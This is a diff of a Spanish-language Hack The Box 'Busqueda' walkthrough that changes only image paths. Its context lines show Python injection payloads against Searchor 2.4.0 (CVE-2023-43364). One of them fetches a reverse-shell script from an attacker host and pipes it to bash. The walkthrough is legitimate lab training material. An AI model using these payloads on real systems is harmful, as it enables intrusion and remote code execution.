@@ -106,7 +106,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
-<figure><img src="../../.gitbook/assets/imagen (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
@@ -186,15 +186,15 @@ Para usarla, solo necesitamos:
 
 Si activamos la opción de redirección automática, seremos llevados directamente a los resultados. De lo contrario, obtendremos la URL de la búsqueda para utilizarla como queramos.
 
-<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Realizaremos una búsqueda básica para ver el funcionamiento de la página web.
 
-<figure><img src="../../.gitbook/assets/imagen (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 En el resultado obtenido, verificamos que se ha realizado la siguiente búsqueda.
 
-<figure><img src="../../.gitbook/assets/imagen (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (3) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Initial Access
 
@@ -202,7 +202,7 @@ En el resultado obtenido, verificamos que se ha realizado la siguiente búsqueda
 
 En la propia página web de `Busqueda`, nos encontramos que la página web utiliza `Flask` y `Searchor 2.4.0`.
 
-<figure><img src="../../.gitbook/assets/imagen (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (4) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Realizando una búsqueda por Internet de posibles vulnerabilidades sobre esta versión, nos encontramos con el siguiente `CVE-2023-43364`.
 
@@ -250,7 +250,7 @@ Para realizar la explotación manual, interceptaremos con `BurpSuite` la solicit
 ' + __import__('os').popen('id').read() + '
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (6) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 El siguiente paso, será lograr obtener una Reverse Shell. Para ello, crearemos en nuestro equipo un archivo llamado `shell.sh` que contiene la Reverse Shell, compartiremos el script a través de un servidor web.
 
@@ -277,7 +277,7 @@ Realizaremos la siguiente inyección de comando para que realize la petición co
 ' + __import__('os').popen('curl http://10.10.16.7/shell.sh|bash').read() + '
 ```
 
-<figure><img src="../../.gitbook/assets/imagen (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (7) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Verificamos que finalmente ganamos acceso al sistema con el usuario`svc` y logramos comprobar la flag de **user.txt**.
 
@@ -457,11 +457,11 @@ Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
 Accederemos a [http://gitea.searcher.htb](http://gitea.searcher.htb) y probaremos de acceder con las credenciales del usuario `cody` localizadas anteriormente.
 
-<figure><img src="../../.gitbook/assets/imagen (9) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (9) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Enumerando el `Gitea`, logramos encontrar un repositorio propio de nuestro usuario.
 
-<figure><img src="../../.gitbook/assets/imagen (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/imagen (10) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Revisamos el repositorio que disponemos, y comprobamos que se trata del archivo de `Searchor`, la página web desde la cual obtuvimos el acceso inicial al sistema.
 
